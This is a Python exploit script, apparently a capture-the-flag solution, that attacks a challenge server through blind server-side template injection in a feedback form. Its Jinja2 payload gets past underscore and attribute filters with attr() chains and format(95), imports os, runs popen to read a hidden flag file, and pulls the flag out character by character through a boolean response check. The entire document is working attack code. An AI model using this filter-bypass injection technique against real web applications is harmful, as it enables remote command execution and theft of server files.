import requests

url = 'http://chall-ctf.ara-its.id:17701'
charset = 'abcdefghijklmnopqrstuvwyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}?!&*#@%^-'
flag = 'ARA6{'

while flag[len(flag) - 1] != '}':
    found = False
    for char in charset:
        print(f'trying {char}')
        payload = "{% if request|attr('application')|attr('%c%cglobals%c%c'|format(95,95,95,95))|attr('get')('%c%cbuiltins%c%c'|format(95,95,95,95))|attr('get')('%c%cimport%c%c'|format(95,95,95,95))('os')|attr('popen')('cat /?????????????????????????????????t?t | cut -c[LENFLAG]-[LENFLAG] | grep \"[CHAR]\" || zzzzzz')|attr('read')() %} YES {% endif %}".replace(
            '[CHAR]', char).replace('[LENFLAG]', str(len(flag) + 1))

        feedback_res = requests.post(
            f'{url}/send-feedback', data={'feedback': payload})

        feedback_id = feedback_res.json()['feedback_id']

        res = requests.get(
            f'{url}/api/private/feedback/{feedback_id}.txt', headers={'Upgrade': 'websocket'})

        if 'YES' in res.text:
            flag += char
            print(flag)
            found = True
            break

    if not found:
        flag += '_'
        print(flag)
